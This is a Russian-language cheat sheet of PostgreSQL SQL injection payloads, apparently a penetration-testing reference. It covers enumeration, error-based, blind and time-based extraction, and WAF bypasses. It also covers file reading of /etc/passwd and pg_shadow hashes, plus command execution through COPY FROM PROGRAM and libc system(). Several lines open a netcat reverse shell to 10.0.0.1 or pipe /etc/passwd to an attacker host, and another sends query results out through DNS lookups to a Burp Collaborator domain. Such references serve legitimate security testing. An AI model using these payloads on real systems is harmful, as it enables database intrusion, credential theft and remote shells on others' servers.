# PostgreSQL-инъекции

> Инъекция SQL в PostgreSQL — это тип уязвимости безопасности, при которой злоумышленники используют неправильно очищенный пользовательский ввод для выполнения несанкционированных SQL-команд в базе данных PostgreSQL.

## Содержание

* [PostgreSQL комментарии](#postgresql-комментарии)
* [PostgreSQL перечисление](#postgresql-перечисление)
* [PostgreSQL методология](#postgresql-методология)
* [PostgreSQL на основе ошибок](#postgresql-на-основе-ошибок)
  * [PostgreSQL XML-помощники](#postgresql-xml-помощники)
* [PostgreSQL слепые инъекции](#postgresql-слепые-инъекции)
  * [PostgreSQL слепые инъекции с эквивалентом SUBSTRING](#postgresql-слепые-инъекции-с-эквивалентом-substring)
* [PostgreSQL на основе времени](#postgresql-на-основе-времени)
* [PostgreSQL out-of-band](#postgresql-out-of-band)
* [PostgreSQL составные запросы](#postgresql-составные-запросы)
* [PostgreSQL манипуляция файлами](#postgresql-манипуляция-файлами)
  * [PostgreSQL чтение файлов](#postgresql-чтение-файлов)
  * [PostgreSQL запись файлов](#postgresql-запись-файлов)
* [PostgreSQL выполнение команд](#postgresql-выполнение-команд)
  * [Использование COPY TO/FROM PROGRAM](#использование-copy-tofrom-program)
  * [Использование libc.so.6](#использование-libcso6)
* [PostgreSQL обход WAF](#postgresql-обход-waf)
  * [Альтернатива кавычкам](#альтернатива-кавычкам)
* [PostgreSQL привилегии](#postgresql-привилегии)
  * [PostgreSQL список привилегий](#postgresql-список-привилегий)
  * [PostgreSQL роль суперпользователя](#postgresql-роль-суперпользователя)
* [Ссылки](#ссылки)

## PostgreSQL комментарии

| Тип | Комментарий |
| --- | --- |
| Однострочный комментарий | `--` |
| Многострочный комментарий | `/**/` |

## PostgreSQL перечисление

| Описание | SQL-запрос |
| --- | --- |
| Версия СУБД | `SELECT version()` |
| Имя базы данных | `SELECT CURRENT_DATABASE()` |
| Схема базы данных | `SELECT CURRENT_SCHEMA()` |
| Список пользователей PostgreSQL | `SELECT usename FROM pg_user` |
| Список хешей паролей | `SELECT usename, passwd FROM pg_shadow` |
| Список администраторов БД | `SELECT usename FROM pg_user WHERE usesuper IS TRUE` |
| Текущий пользователь | `SELECT user;` |
| Текущий пользователь | `SELECT current_user;` |
| Текущий пользователь | `SELECT session_user;` |
| Текущий пользователь | `SELECT usename FROM pg_user;` |
| Текущий пользователь | `SELECT getpgusername();` |

## PostgreSQL методология

| Описание | SQL-запрос |
| --- | --- |
| Список схем | `SELECT DISTINCT(schemaname) FROM pg_tables` |
| Список баз данных | `SELECT datname FROM pg_database` |
| Список таблиц | `SELECT table_name FROM information_schema.tables` |
| Список таблиц | `SELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA_NAME>'` |
| Список таблиц | `SELECT tablename FROM pg_tables WHERE schemaname = '<SCHEMA_NAME>'` |
| Список столбцов | `SELECT column_name FROM information_schema.columns WHERE table_name='data_table'` |

## PostgreSQL на основе ошибок

| Название | Полезная нагрузка |
| --- | --- |
| CAST | `AND 1337=CAST('~'||(SELECT version())::text||'~' AS NUMERIC) -- -` |
| CAST | `AND (CAST('~'||(SELECT version())::text||'~' AS NUMERIC)) -- -` |
| CAST | `AND CAST((SELECT version()) AS INT)=1337 -- -` |
| CAST | `AND (SELECT version())::int=1 -- -` |

```sql
CAST(chr(126)||VERSION()||chr(126) AS NUMERIC)
CAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)--
CAST(chr(126)||(SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset)||chr(126) AS NUMERIC)--
CAST(chr(126)||(SELECT data_column FROM data_table LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)
```
```sql
' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1
' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1
```

## PostgreSQL XML-помощники

```sql
SELECT query_to_xml('select * from pg_user',true,true,''); -- возвращает все результаты в виде одной XML-строки
```

Приведённый выше `query_to_xml` возвращает все результаты указанного запроса в виде одного результата. Объедините это с техникой PostgreSQL на основе ошибок, чтобы извлечь данные без необходимости ограничивать запрос одним результатом.

```sql
SELECT database_to_xml(true,true,''); -- выгрузить текущую базу данных в XML
SELECT database_to_xmlschema(true,true,''); -- выгрузить текущую БД в XML-схему
```

Обратите внимание: при использовании приведённых выше запросов вывод должен быть собран в памяти. Для больших баз данных это может вызвать замедление или состояние отказа в обслуживании.

## PostgreSQL слепые инъекции

### PostgreSQL слепые инъекции с эквивалентом SUBSTRING

| Функция | Пример |
| --- | --- |
| SUBSTR | `SUBSTR('foobar', <START>, <LENGTH>)` |
| SUBSTRING | `SUBSTRING('foobar', <START>, <LENGTH>)` |
| SUBSTRING | `SUBSTRING('foobar' FROM <START> FOR <LENGTH>)` |

Примеры:

```sql
' and substr(version(),1,10) = 'PostgreSQL' and '1  -- TRUE
' and substr(version(),1,10) = 'PostgreXXX' and '1  -- FALSE
```

## PostgreSQL на основе времени

Определение инъекции на основе времени:

```sql
select 1 from pg_sleep(5)
;(select 1 from pg_sleep(5))
||(select 1 from pg_sleep(5))
```

Выгрузка базы данных на основе времени:

```sql
select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1
```

Выгрузка таблицы на основе времени:

```sql
select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1
```

Выгрузка столбцов на основе времени:

```sql
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1

AND 'RANDSTR'||PG_SLEEP(10)='RANDSTR'
AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
```

## PostgreSQL out-of-band

Out-of-band SQL-инъекции в PostgreSQL полагаются на использование функций, которые могут взаимодействовать с файловой системой или сетью, таких как `COPY`, `lo_export` или функций из расширений, способных выполнять сетевые действия. Идея заключается в том, чтобы использовать базу данных для отправки данных в другое место, которое злоумышленник может отслеживать и перехватывать.

```sql
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
```

## PostgreSQL составные запросы

Используйте точку с запятой `;`, чтобы добавить ещё один запрос:

```sql
SELECT 1;CREATE TABLE NOTSOSECURE (DATA VARCHAR(200));--
```

## PostgreSQL манипуляция файлами

### PostgreSQL чтение файлов

ПРИМЕЧАНИЕ: Ранние версии Postgres не принимали абсолютные пути в `pg_read_file` или `pg_ls_dir`. Новые версии (начиная с коммита `0fdc8495bff02684142a44ab3bc5b18a8ca1863a`) позволяют читать любой файл/путь к файлу суперпользователям или пользователям из группы `default_role_read_server_files`.

Использование `pg_read_file`, `pg_ls_dir`:

```sql
select pg_ls_dir('./');
select pg_read_file('PG_VERSION', 0, 200);
```

Использование `COPY`:

```sql
CREATE TABLE temp(t TEXT);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp limit 1 offset 0;
```

Использование `lo_import`:

```sql
SELECT lo_import('/etc/passwd'); -- создаст большой объект из файла и вернёт OID
SELECT lo_get(16420); -- используйте OID, возвращённый выше
SELECT * from pg_largeobject; -- или просто получите все большие объекты и их данные
```

### PostgreSQL запись файлов

Использование `COPY`:

```sql
CREATE TABLE nc (t TEXT);
INSERT INTO nc(t) VALUES('nc -lvvp 2346 -e /bin/bash');
SELECT * FROM nc;
COPY nc(t) TO '/tmp/nc.sh';
```

Использование `COPY` (одной строкой):

```sql
COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';
```

Использование `lo_from_bytea`, `lo_put` и `lo_export`:

```sql
SELECT lo_from_bytea(43210, 'your file data goes in here'); -- создать большой объект с OID 43210 и некоторыми данными
SELECT lo_put(43210, 20, 'some other data'); -- добавить данные в большой объект со смещением 20
SELECT lo_export(43210, '/tmp/testexport'); -- экспортировать данные в /tmp/testexport
```

## PostgreSQL выполнение команд

### Использование COPY TO/FROM PROGRAM

Установки, работающие на Postgres 9.3 и выше, имеют функциональность, позволяющую суперпользователю и пользователям с `pg_execute_server_program` направлять данные в внешнюю программу и из неё с помощью `COPY`.

```sql
COPY (SELECT '') TO PROGRAM 'getent hosts $(whoami).[BURP_COLLABORATOR_DOMAIN_CALLBACK]';
COPY (SELECT '') to PROGRAM 'nslookup [BURP_COLLABORATOR_DOMAIN_CALLBACK]'

CREATE TABLE shell(output text);
COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f';
```

### Использование libc.so.6

```sql
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
```

## PostgreSQL обход WAF

### Альтернатива кавычкам

> PostgreSQL предлагает несколько способов создания строковых значений без использования стандартных литералов в одинарных кавычках. Функция `CHR()` может генерировать отдельные символы из их числовых кодов, которые затем можно объединить с помощью оператора конкатенации (`||`). PostgreSQL также поддерживает долларовые строки (dollar-quoted strings), доступные начиная с версии 8, позволяющие заключать текст между разделителями `$$` без экранирования встроенных одинарных кавычек.

| Полезная нагрузка | Техника |
| --- | --- |
| `SELECT CHR(65)||CHR(66)||CHR(67);` | Строка из CHR() |
| `SELECT $$NoQuote$$` | Долларовая строка (>= версии 8 PostgreSQL) |

## PostgreSQL привилегии

### PostgreSQL список привилегий

Получить все привилегии уровня таблицы для текущего пользователя, исключая таблицы в системных схемах, таких как `pg_catalog` и `information_schema`.

```sql
SELECT * FROM information_schema.role_table_grants WHERE grantee = current_user AND table_schema NOT IN ('pg_catalog', 'information_schema');
```

### PostgreSQL роль суперпользователя

```sql
SHOW is_superuser; 
SELECT current_setting('is_superuser');
SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
```

## Ссылки

* [SQL Injection and Postgres - An Adventure to Eventual RCE - Denis Andzakovic - May 5, 2020](https://web.archive.org/web/20251210040037/https://pulsesecurity.co.nz/articles/postgres-sqli)
* [Authenticated Arbitrary Command Execution on PostgreSQL 9.3 > Latest - GreenWolf - March 20, 2019](https://web.archive.org/web/20250803101126/https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)
* [A Penetration Tester's Guide to PostgreSQL - David Hayter - July 22, 2017](https://web.archive.org/web/20250812102408/https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9)
* []()
